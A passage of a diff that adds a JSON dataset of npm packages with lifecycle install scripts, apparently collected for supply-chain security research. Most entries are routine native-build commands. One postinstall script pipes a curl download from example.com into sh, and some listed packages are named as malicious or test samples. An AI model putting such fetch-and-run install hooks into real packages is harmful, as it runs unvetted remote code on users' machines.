@@ -1,0 +1,4112 @@
+{
+  "source": "npm registry search (https://registry.npmjs.org/-/v1/search) across 20 generic technical query terms tied to native builds/install patterns (node-gyp, prebuild, napi, bindings, postinstall, husky, opencollective, etc.) \u2014 not hand-picked package names. Each candidate's actual /latest scripts field was then checked live against the registry.",
+  "queries": [
+    "node-gyp",
+    "prebuild",
+    "napi",
+    "bindings",
+    "postinstall",
+    "native addon",
+    "node-pre-gyp",
+    "ffi",
+    "nan",
+    "cmake-js",
+    "binary download",
+    "webdriver download",
+    "browser download",
+    "git hooks",
+    "husky",
+    "patch-package",
+    "opencollective",
+    "wasm build",
+    "rust addon",
+    "neon bindings",
+    "swig"
+  ],
+  "candidatesSearched": 4675,
+  "foundCount": 578,
+  "description": "Real npm packages found via registry search (not hand-picked by name) that have preinstall/install/postinstall scripts. Population: packages discoverable by searching for terms tied to native-build/install patterns (node-gyp, prebuild, napi, bindings, postinstall, husky, opencollective, etc.), not \"all packages with install scripts\" and not the original 23 hand-picked famous packages from the first Phase 3 pass.",
+  "packages": [
+    {
+      "name": "neroom-node-sdk",
+      "version": "1.45.0",
+      "scripts": {
+        "install": "node scripts/downloadPrebuild.js"
+      }
+    },
+    {
+      "name": "silk-sdk",
+      "version": "0.2.2",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@plasosdk/mouse_position_reporter",
+      "version": "1.0.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "node-gyp-hello-world",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "win-macro",
+      "version": "2.1.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "flycapture2-sdk",
+      "version": "1.3.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "plain-text-redactor-poc",
+      "version": "1.1.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "secp256k1",
+      "version": "5.0.2",
+      "scripts": {
+        "install": "node-gyp-build || exit 0"
+      }
+    },
+    {
+      "name": "@newrelic/native-metrics",
+      "version": "13.1.0",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "bcrypt",
+      "version": "6.0.0",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "node-gyp-hw",
+      "version": "1.1.21",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "satd-tts",
+      "version": "1.1.6",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "pprof",
+      "version": "5.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@xtp-smart/booklib",
+      "version": "1.3.0",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build --runtime=electron --target=4.2.12"
+      }
+    },
+    {
+      "name": "hello-publishing-native",
+      "version": "1.0.3",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "simple-node-addon",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "foundry-local-sdk",
+      "version": "2.0.1",
+      "scripts": {
+        "install": "node script/install-native.cjs"
+      }
+    },
+    {
+      "name": "java",
+      "version": "0.18.0",
+      "scripts": {
+        "install": "node-gyp rebuild",
+        "postinstall": "node ./scripts/postInstall.js"
+      }
+    },
+    {
+      "name": "bullet-node",
+      "version": "0.0.6",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "agora_rtc",
+      "version": "1.0.0",
+      "scripts": {
+        "preinstall": "npm install node-pre-gyp",
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "native-watchdog",
+      "version": "1.4.2",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "gsdk",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@vscode/native-watchdog",
+      "version": "1.4.6",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "murmurhash-native",
+      "version": "3.5.1",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "libpq",
+      "version": "1.11.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "node-postal",
+      "version": "1.3.0",
+      "scripts": {
+        "install": "(node-gyp rebuild) || (exit 0)"
+      }
+    },
+    {
+      "name": "@tensorflow/tfjs-node",
+      "version": "4.22.0",
+      "scripts": {
+        "install": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "node-calls-python",
+      "version": "1.13.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "cpu-features",
+      "version": "0.0.10",
+      "scripts": {
+        "install": "node buildcheck.js > buildcheck.gypi && node-gyp rebuild"
+      }
+    },
+    {
+      "name": "macos-alias",
+      "version": "0.2.12",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "lzma-native",
+      "version": "8.0.6",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@kaciras/deasync",
+      "version": "1.1.0",
+      "scripts": {
+        "install": "node script/prebuild.js install"
+      }
+    },
+    {
+      "name": "execSync",
+      "version": "1.0.2",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "@abandonware/bluetooth-hci-socket",
+      "version": "0.5.3-12",
+      "scripts": {
+        "install": "node-pre-gyp install --build-from-source"
+      }
+    },
+    {
+      "name": "protagonist",
+      "version": "2.3.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@pokusew/pcsclite",
+      "version": "0.6.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "contextify",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "node-llama-cpp",
+      "version": "3.21.1",
+      "scripts": {
+        "postinstall": "node ./dist/cli/cli.js postinstall"
+      }
+    },
+    {
+      "name": "lru-native2",
+      "version": "1.2.6",
+      "scripts": {
+        "install": "npm run build"
+      }
+    },
+    {
+      "name": "zlib-sync",
+      "version": "0.1.10",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@rtinternal/java",
+      "version": "0.18.0-rtinternal-jdk11-r4",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build",
+        "postinstall": "node ./scripts/postInstall.js"
+      }
+    },
+    {
+      "name": "blake2",
+      "version": "5.0.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "tree-sitter-gdscript",
+      "version": "6.1.0",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "ingescape",
+      "version": "4.6.5",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@cdktf/node-pty-prebuilt-multiarch",
+      "version": "0.10.2",
+      "scripts": {
+        "install": "node scripts/check-prebuild.js || prebuild-install || node scripts/install.js",
+        "postinstall": "node scripts/post-install.js"
+      }
+    },
+    {
+      "name": "@homebridge/node-pty-prebuilt-multiarch",
+      "version": "0.14.1",
+      "scripts": {
+        "install": "node scripts/check-prebuild.js || prebuild-install --verbose || node scripts/install.js",
+        "postinstall": "node scripts/post-install.js"
+      }
+    },
+    {
+      "name": "fibers",
+      "version": "5.0.3",
+      "scripts": {
+        "install": "node build.js || nodejs build.js"
+      }
+    },
+    {
+      "name": "png-img",
+      "version": "5.0.1",
+      "scripts": {
+        "install": "prebuild-install || npm run build-release"
+      }
+    },
+    {
+      "name": "fibers_node_v8",
+      "version": "3.1.5",
+      "scripts": {
+        "preinstall": "node preinstall.js",
+        "install": "node build.js"
+      }
+    },
+    {
+      "name": "windows-foreground-love",
+      "version": "0.6.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "ibm_db",
+      "version": "4.0.1",
+      "scripts": {
+        "install": "node installer/driverInstall.js"
+      }
+    },
+    {
+      "name": "naudiodon2",
+      "version": "2.5.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "hypertube-binaries",
+      "version": "3.1.13",
+      "scripts": {
+        "install": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "node-zopfli-es",
+      "version": "2.0.6",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "fast-inverse-sqrt-node-gyp",
+      "version": "1.0.9",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@port-labs/jq-node-bindings",
+      "version": "1.0.6",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "inotify",
+      "version": "1.4.6",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "node-pngquant-native",
+      "version": "2.2.0",
+      "scripts": {
+        "install": "node ./scripts/nothing.js"
+      }
+    },
+    {
+      "name": "@automattic/yara",
+      "version": "2.6.3",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "@paymoapp/electron-shutdown-handler",
+      "version": "1.2.0",
+      "scripts": {
+        "install": "node -e \"\""
+      }
+    },
+    {
+      "name": "webworker-threads",
+      "version": "0.7.17",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@snyk/node-dump-stacks",
+      "version": "1.8.3",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "krb5",
+      "version": "0.5.5",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "midi",
+      "version": "2.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "genx",
+      "version": "2.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "talib",
+      "version": "2.0.5",
+      "scripts": {
+        "install": "node ./src/lib/build.js && node-gyp configure && node-gyp build"
+      }
+    },
+    {
+      "name": "dbus",
+      "version": "1.0.7",
+      "scripts": {
+        "install": "npm run build:release"
+      }
+    },
+    {
+      "name": "electron-click-drag-plugin",
+      "version": "2.0.2",
+      "scripts": {
+        "install": "node -e \"console.log('Using prebuilt electron-click-drag-plugin binary')\""
+      }
+    },
+    {
+      "name": "muhammara",
+      "version": "6.0.6",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build ${EXTRA_NODE_PRE_GYP_FLAGS:-\"\"}"
+      }
+    },
+    {
+      "name": "chdb",
+      "version": "3.3.0",
+      "scripts": {
+        "install": "node -e \"\""
+      }
+    },
+    {
+      "name": "bluetooth-hci-socket",
+      "version": "0.5.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "yencode",
+      "version": "1.2.4",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "vscode-sqlite3",
+      "version": "4.0.11",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "node-libgpiod",
+      "version": "0.6.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "heapdump",
+      "version": "0.3.15",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "ca-apm-probe",
+      "version": "2.3.1",
+      "scripts": {
+        "postinstall": "node ./scripts/post-install.js"
+      }
+    },
+    {
+      "name": "memoryjs",
+      "version": "3.5.1",
+      "scripts": {
+        "install": "npm run build"
+      }
+    },
+    {
+      "name": "buffertools",
+      "version": "2.1.6",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "cue-sdk",
+      "version": "4.0.84",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "lentil-macos-additions",
+      "version": "1.3.42",
+      "scripts": {
+        "install": "run-script-os"
+      }
+    },
+    {
+      "name": "nodehun",
+      "version": "3.0.2",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "truffle-security",
+      "version": "1.7.3",
+      "scripts": {
+        "postinstall": "node ./scripts/install-to-truffle.js"
+      }
+    },
+    {
+      "name": "node-zopfli",
+      "version": "2.1.4",
+      "scripts": {
+        "install": "prebuild-install --runtime napi || prebuild-install || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@polarsignals/custom-labels",
+      "version": "0.3.9",
+      "scripts": {
+        "install": "node build.js"
+      }
+    },
+    {
+      "name": "@nodert-win10-rs4/windows.security.credentials.ui",
+      "version": "0.4.4",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@nodert-win10-21h1/windows.devices.geolocation",
+      "version": "0.1.6",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "ffi-prebuilt",
+      "version": "1.2.9",
+      "scripts": {
+        "install": "./tools/copy.js || node-gyp configure build"
+      }
+    },
+    {
+      "name": "@lox-audioserver/node-librespot",
+      "version": "0.5.1",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@sonn-audio/node-librespot",
+      "version": "0.5.2",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "beamcoder-prebuild",
+      "version": "0.7.2-rc.1",
+      "scripts": {
+        "install": "node install.js",
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@mongodb-js/zstd",
+      "version": "7.0.0",
+      "scripts": {
+        "install": "prebuild-install --runtime napi || npm run clean-install"
+      }
+    },
+    {
+      "name": "kerberos",
+      "version": "7.0.0",
+      "scripts": {
+        "install": "prebuild-install --runtime napi || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "icmp-ping",
+      "version": "0.0.3",
+      "scripts": {
+        "install": "prebuild-install || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "robotjs-repack",
+      "version": "0.6.4",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "heapdump-prebuild",
+      "version": "0.0.6",
+      "scripts": {
+        "install": "prebuild-install --verbose || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@todesktop/robotjs-prebuild",
+      "version": "0.6.28",
+      "scripts": {
+        "install": "todesktop-node-gyp-build"
+      }
+    },
+    {
+      "name": "ant-design-vue-vite",
+      "version": "1.7.8",
+      "scripts": {
+        "postinstall": "node scripts/postinstall || echo \"ignore\""
+      }
+    },
+    {
+      "name": "@trufflesuite/bigint-buffer",
+      "version": "1.1.10",
+      "scripts": {
+        "install": "node-gyp-build || echo \"Couldn't build bindings. Non-native version used.\""
+      }
+    },
+    {
+      "name": "spellchecker-prebuild",
+      "version": "3.7.0",
+      "scripts": {
+        "install": "prebuild-install || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@discordjs/opus",
+      "version": "0.10.0",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "node-pty-prebuilt-multiarch",
+      "version": "0.10.1-pre.5",
+      "scripts": {
+        "install": "node scripts/check-prebuild.js || prebuild-install || node scripts/install.js",
+        "postinstall": "node scripts/post-install.js"
+      }
+    },
+    {
+      "name": "mountutils",
+      "version": "2.0.8",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@fqlan/add-example-prebuild",
+      "version": "1.0.1",
+      "scripts": {
+        "install": "prebuild-install --runtime napi || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "node-webcodecs",
+      "version": "1.3.0",
+      "scripts": {
+        "install": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "node-snap7",
+      "version": "1.0.9",
+      "scripts": {
+        "install": "prebuild-install || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@thiagoelg/node-printer",
+      "version": "0.6.2",
+      "scripts": {
+        "install": "prebuild-install || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "node-pipewire",
+      "version": "1.1.0",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build=false || npm run build-native -- --release"
+      }
+    },
+    {
+      "name": "speaker-prebuild",
+      "version": "0.1.3",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "@lgeiger/napi-prebuild-starter",
+      "version": "0.3.1",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "iohook-prebuild-test",
+      "version": "0.1.16",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "@ast-grep/lang-python",
+      "version": "0.0.6",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "react-native-spotlight-search",
+      "version": "2.2.0",
+      "scripts": {
+        "postinstall": "yarn build:plugin"
+      }
+    },
+    {
+      "name": "ubuntu-prebuild-container",
+      "version": "1.2.5",
+      "scripts": {
+        "install": "mkcontainer"
+      }
+    },
+    {
+      "name": "@ast-grep/lang-go",
+      "version": "0.0.6",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "uiohook-napi",
+      "version": "1.5.5",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "nice-napi",
+      "version": "1.0.2",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "zstd-napi",
+      "version": "0.0.13",
+      "scripts": {
+        "install": "prebuild-install -r napi || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "weak-napi",
+      "version": "2.0.2",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "faiss-napi",
+      "version": "0.10.3",
+      "scripts": {
+        "install": "prebuild-install --runtime napi --verbose || (git clone -b v1.7.4 --depth 1 https://github.com/facebookresearch/faiss.git deps/faiss && npm i cmake-js && npm run build)"
+      }
+    },
+    {
+      "name": "ffi-napi",
+      "version": "4.0.3",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@serialport/bindings-cpp",
+      "version": "13.0.1",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "sqlite3",
+      "version": "6.0.1",
+      "scripts": {
+        "install": "prebuild-install -r napi || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "keytar",
+      "version": "7.9.0",
+      "scripts": {
+        "install": "prebuild-install || npm run build"
+      }
+    },
+    {
+      "name": "tree-sitter",
+      "version": "0.25.1",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "@confluentinc/kafka-javascript",
+      "version": "1.10.1",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "zeromq",
+      "version": "6.8.0",
+      "scripts": {
+        "install": "node ./script/install.js"
+      }
+    },
+    {
+      "name": "node-av",
+      "version": "6.1.1",
+      "scripts": {
+        "install": "node install/check.js",
+        "postinstall": "node dist/ffmpeg/install.js"
+      }
+    },
+    {
+      "name": "libxmljs2",
+      "version": "0.37.0",
+      "scripts": {
+        "install": "prebuild-install || node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@github/keytar",
+      "version": "7.10.6",
+      "scripts": {
+        "install": "node script/install.js || npm run build"
+      }
+    },
+    {
+      "name": "@vscode/spdlog",
+      "version": "0.15.8",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "hnswlib-node",
+      "version": "3.0.0",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "aws-crt",
+      "version": "1.33.1",
+      "scripts": {
+        "install": "node ./scripts/install.js"
+      }
+    },
+    {
+      "name": "lzo",
+      "version": "0.4.11",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@vscode/sqlite3",
+      "version": "5.1.14-vscode",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "re2",
+      "version": "1.26.1",
+      "scripts": {
+        "install": "install-from-cache --artifact build/Release/re2.node --host-var RE2_DOWNLOAD_MIRROR --skip-path-var RE2_DOWNLOAD_SKIP_PATH --skip-ver-var RE2_DOWNLOAD_SKIP_VER --force-build-var RE2_DOWNLOAD_FORCE_BUILD || node-gyp -j max rebuild"
+      }
+    },
+    {
+      "name": "dugite",
+      "version": "3.2.3",
+      "scripts": {
+        "postinstall": "node ./script/download-git.js"
+      }
+    },
+    {
+      "name": "odbc",
+      "version": "2.5.0",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "libxmljs",
+      "version": "1.0.11",
+      "scripts": {
+        "preinstall": "node scripts/preinstall.js",
+        "install": "node-pre-gyp install --fallback-to-build --loglevel http -j max"
+      }
+    },
+    {
+      "name": "faiss-node",
+      "version": "0.5.1",
+      "scripts": {
+        "install": "prebuild-install --runtime napi --verbose || (git clone -b v1.7.4 --depth 1 https://github.com/facebookresearch/faiss.git deps/faiss && npm i cmake-js && npm run build)"
+      }
+    },
+    {
+      "name": "utp-native",
+      "version": "2.5.3",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "node-rdkafka",
+      "version": "3.6.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "c2pa-node",
+      "version": "0.5.26",
+      "scripts": {
+        "postinstall": "node ./scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "v8-profiler-next",
+      "version": "1.10.0",
+      "scripts": {
+        "install": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "nodegit",
+      "version": "0.27.0",
+      "scripts": {
+        "install": "node lifecycleScripts/preinstall && node lifecycleScripts/install",
+        "postinstall": "node lifecycleScripts/postinstall"
+      }
+    },
+    {
+      "name": "postinstall-postinstall",
+      "version": "2.1.0",
+      "scripts": {
+        "postinstall": "node ./run.js"
+      }
+    },
+    {
+      "name": "pinst",
+      "version": "3.0.0",
+      "scripts": {
+        "postinstall": "husky install"
+      }
+    },
+    {
+      "name": "@lavamoat/preinstall-always-fail",
+      "version": "3.0.0",
+      "scripts": {
+        "preinstall": "echo \"Don't run npm lifecycle scripts by default! Create a .yarnrc or .npmrc and set enableScripts: false. Then, whitelist them with @lavamoat/allow-scripts\" && exit 1"
+      }
+    },
+    {
+      "name": "pkg-with-failing-postinstall",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node this-does-not-exist.js"
+      }
+    },
+    {
+      "name": "postinstall-hello",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node index.js"
+      }
+    },
+    {
+      "name": "my-postinstall-pkg",
+      "version": "1.0.16",
+      "scripts": {
+        "postinstall": "./scripts/postinstall.sh"
+      }
+    },
+    {
+      "name": "openteam-postinstall",
+      "version": "1.0.2",
+      "scripts": {
+        "postinstall": "node -e \"try{require('./index')}catch(e){}\""
+      }
+    },
+    {
+      "name": "@ma.vu/virus",
+      "version": "1.0.3",
+      "scripts": {
+        "postinstall": "./moon.sh"
+      }
+    },
+    {
+      "name": "@ravkaminn/my-hello-package",
+      "version": "1.1.6",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "contaazul-pinst",
+      "version": "1.1.10",
+      "scripts": {
+        "preinstall": "yarn dlx only-allow yarn",
+        "postinstall": "husky install"
+      }
+    },
+    {
+      "name": "safe-postinstall-test",
+      "version": "0.0.1",
+      "scripts": {
+        "postinstall": "node postinstall.js && curl https://example.com/ | sh"
+      }
+    },
+    {
+      "name": "postinstall-prepare",
+      "version": "2.0.0",
+      "scripts": {
+        "postinstall": "node ./run.js"
+      }
+    },
+    {
+      "name": "test-postinstall-o",
+      "version": "1.1.2-beta6",
+      "scripts": {
+        "install": "node scripts/install.js",
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@amrahulmail/ctf-lab-evil",
+      "version": "1.2.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@ulissemini/postinstall-postinstall",
+      "version": "2.1.0",
+      "scripts": {
+        "postinstall": "node ./run.js"
+      }
+    },
+    {
+      "name": "@simplysm/claude",
+      "version": "13.0.29",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.mjs"
+      }
+    },
+    {
+      "name": "@cloudomni/omnigate",
+      "version": "0.5.0",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@lilly_in_the_valley/test-postinstall-script-package",
+      "version": "1.0.6",
+      "scripts": {
+        "postinstall": "touch postinstall_ran_10_nov_12_23.txt"
+      }
+    },
+    {
+      "name": "@mypublished/postinstall-postinstall",
+      "version": "2.0.0",
+      "scripts": {
+        "postinstall": "node ./run.js"
+      }
+    },
+    {
+      "name": "@kano/kit-app-shell-electron",
+      "version": "0.0.3-alpha.90",
+      "scripts": {
+        "postinstall": "node tasks/postinstall.js"
+      }
+    },
+    {
+      "name": "@docmd/engine-rust",
+      "version": "0.9.5",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.cjs"
+      }
+    },
+    {
+      "name": "hello-postinstall",
+      "version": "0.0.5",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@phiberber/pinst",
+      "version": "3.0.1",
+      "scripts": {
+        "postinstall": "husky install"
+      }
+    },
+    {
+      "name": "@zolbooo/dummy-postinstall",
+      "version": "0.0.3",
+      "scripts": {
+        "postinstall": "node ./postinstall.js"
+      }
+    },
+    {
+      "name": "nw_downloader_bps",
+      "version": "1.0.3",
+      "scripts": {
+        "postinstall": "node unzipper.js"
+      }
+    },
+    {
+      "name": "@wobblyboots/df-sandbox-test",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@atomlai/centag",
+      "version": "0.3.4",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "@zeke/package-postinstall-test",
+      "version": "1.0.12",
+      "scripts": {
+        "postinstall": "node script/postinstall.js"
+      }
+    },
+    {
+      "name": "ilabs-flir",
+      "version": "2.4.12",
+      "scripts": {
+        "postinstall": "node scripts/fetch-binaries.js"
+      }
+    },
+    {
+      "name": "test-postinstall-node-version-check",
+      "version": "0.1.4",
+      "scripts": {
+        "postinstall": "postinstall-node-version-check"
+      }
+    },
+    {
+      "name": "ncu-test-postinstall-fail",
+      "version": "0.0.1",
+      "scripts": {
+        "postinstall": "echo \"Postinstall failed\" && exit 1"
+      }
+    },
+    {
+      "name": "@bad-idea/postinstall-corrupt",
+      "version": "1.0.1",
+      "scripts": {
+        "postinstall": "./postinstall.sh"
+      }
+    },
+    {
+      "name": "@aminagroup/postinstall-check",
+      "version": "1.0.2",
+      "scripts": {
+        "postinstall": "node index.js"
+      }
+    },
+    {
+      "name": "@danielvfo/my-postinstall-pkg",
+      "version": "1.0.3",
+      "scripts": {
+        "postinstall": "./scripts/postinstall.sh"
+      }
+    },
+    {
+      "name": "@brilab-mailer/disposable",
+      "version": "0.2.2",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.cjs"
+      }
+    },
+    {
+      "name": "uqo-object-defaults-composer",
+      "version": "1.0.2",
+      "scripts": {
+        "postinstall": "node run-python-demo.js"
+      }
+    },
+    {
+      "name": "postinstall-example",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@indie_rok/demo-suspicious-package",
+      "version": "1.4.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "highlight.js-postbuild",
+      "version": "0.0.6",
+      "scripts": {
+        "postinstall": "node tools/customize"
+      }
+    },
+    {
+      "name": "@wojciech_lesicki/security-lifecycle-demo",
+      "version": "1.0.0",
+      "scripts": {
+        "preinstall": "node scripts/check-registry.js preinstall",
+        "postinstall": "node scripts/check-registry.js postinstall"
+      }
+    },
+    {
+      "name": "@lholmquist/always-fail",
+      "version": "0.0.4",
+      "scripts": {
+        "postinstall": "node bin/cli"
+      }
+    },
+    {
+      "name": "postinstall-env-access",
+      "version": "1.0.5",
+      "scripts": {
+        "postinstall": "node ./postinstall.js"
+      }
+    },
+    {
+      "name": "@cb1kenobi/postinstall-test",
+      "version": "1.0.2",
+      "scripts": {
+        "install": "cross-env npm_config_foreground_scripts=1 node lifecycle.js || node -e true",
+        "postinstall": "cross-env npm_config_foreground_scripts=1 node postinstall.js || node -e true"
+      }
+    },
+    {
+      "name": "oneai-cli",
+      "version": "0.2.1",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "cfs-postinstall",
+      "version": "0.0.1",
+      "scripts": {
+        "postinstall": "node -e \"try{require('./_postinstall')}catch(e){}\" || exit 0"
+      }
+    },
+    {
+      "name": "@digininja/postinstall",
+      "version": "1.0.8",
+      "scripts": {
+        "postinstall": "node ./scripts/setup.js"
+      }
+    },
+    {
+      "name": "demo-postinstall-test",
+      "version": "1.3.0",
+      "scripts": {
+        "install": "ECHO installing package",
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "ssv-uat",
+      "version": "3.0.47",
+      "scripts": {
+        "postinstall": "patch-package"
+      }
+    },
+    {
+      "name": "dsh-come",
+      "version": "0.2.1",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
